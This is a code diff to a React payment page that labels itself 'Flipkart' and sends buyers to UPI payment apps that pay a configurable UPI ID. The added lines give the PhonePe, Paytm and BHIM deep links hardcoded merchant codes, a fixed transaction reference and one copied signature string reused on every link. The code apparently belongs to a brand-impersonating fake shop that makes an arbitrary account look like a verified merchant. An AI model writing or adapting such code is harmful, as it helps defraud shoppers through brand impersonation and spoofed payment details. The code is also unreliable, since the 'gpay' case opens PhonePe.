@@ -74,73 +74,39 @@ export default function PaymentPage() {
       return;
     }
 
-    const orderNumber = Math.floor(Math.random() * 10000000000);
-    const site_name = "Flipkart";
-    const amt = selling_price.toFixed(2);
-    const upi_address = upiId;
-
-    // Optional: Save payment initiation in your DB
-    try {
-      const { error } = await supabase.from("payments4").insert([{ amount: selling_price }]);
-      if (error) {
-        console.error("Supabase insert error:", error.message);
-        alert("Failed to initiate payment. Please try again.");
-        return;
-      }
-    } catch (e) {
-      console.error("Unexpected error:", e);
-      return;
-    }
-
-    let redirect_url = "";
-
-    // Use standard UPI scheme for all apps to maximize compatibility
-    // mc (merchant code) omitted or set to '0000' as placeholder
-
-    switch (selected) {
-      case "phonepe":
-        redirect_url = `upi://pay?pa=${encode(upi_address)}&pn=${encode(
-          site_name
-        )}&am=${amt}&cu=INR&tn=${encode(orderNumber.toString())}`;
-        break;
-
-      case "gpay":
-        redirect_url = `upi://pay?pa=${encode(upi_address)}&pn=${encode(
-          site_name
-        )}&am=${amt}&tn=${encode("Flipkart_" + orderNumber)}&tr=${encode(
-          orderNumber.toString()
-        )}&cu=INR`;
-        break;
-
-      case "paytm":
-        redirect_url = `upi://pay?pa=${encode(upi_address)}&pn=${encode(
-          site_name
-        )}&am=${amt}&tr=${encode(orderNumber.toString())}&cu=INR&tn=${encode(
-          orderNumber.toString()
-        )}`;
-        break;
-
-      case "bhim_upi":
-        redirect_url = `upi://pay?pa=${encode(upi_address)}&pn=${encode(
-          site_name
-        )}&am=${amt}&tr=${encode(orderNumber.toString())}&cu=INR&tn=${encode(
-          orderNumber.toString()
-        )}`;
-        break;
-
-      case "whatspp_pay":
-        // Standard UPI scheme works for any UPI app
-        redirect_url = `upi://pay?pa=${encode(upi_address)}&pn=${encode(
-          site_name
-        )}&am=${amt}&cu=INR&tn=${encode(site_name)}`;
-        break;
-
-      default:
-        alert("Please select a valid payment method.");
-        return;
-    }
-
-    // Open the UPI app via the intent URI
+    const orderNumber = Math.floor(Math.random() * 10000000000); 
+    const payType = selected; 
+    let redirect_url = ""; 
+    const site_name = "Flipkart"; 
+    const upi_address = upiId; 
+    const amt = selling_price;
+    if (selling_price) {
+        console.log("come"); 
+        const amount = selling_price.toFixed(2); 
+        // ✅ insert only amount 
+        const { error } = await supabase.from("payments4").insert([{ amount }]); 
+        if (error) { 
+            console.error("Supabase insert error:", error.message); 
+        }
+    } 
+    switch (payType) { 
+        case 'gpay': 
+            // redirect_url = "gpay://upi/pay?pa=" + upi_address + "&am=" + amt + "&pn=FLIPKART&tn=Flipkart_" + orderNumber + "&tr=" + orderNumber + "&mc=0000&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr"; 
+            redirect_url = "phonepe://pay?pa=" + upi_address + "&pn=" + site_name + "&am=" + amt + "&mc=8999&cu=INR&tn=" + orderNumber + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr"; 
+            break; 
+        case 'phonepe': 
+            redirect_url = "phonepe://pay?pa=" + upi_address + "&pn=" + site_name + "&am=" + amt + "&mc=8999&cu=INR&tn=" + orderNumber + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr"; 
+            break; 
+        case 'paytm': 
+            redirect_url = "paytmmp://pay?pa=" + upi_address + "&pn=" + site_name + "&am=" + amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn=" + orderNumber + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr"; 
+            break; 
+        case 'bhim_upi': 
+            redirect_url = "bhim://pay?pa=" + upi_address + "&pn=" + site_name + "&am=" + amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn=" + orderNumber + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr"; 
+            break; 
+        case 'whatspp_pay': 
+            redirect_url = "upi://pay?pa=" + upi_address + "&pn=" + site_name + "&tn=" + site_name + "&am=" + amt + "&cu=INR" + "&tr=" + orderNumber + "&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr"; 
+            break;
+    } 
     window.location.href = redirect_url;
   };
 
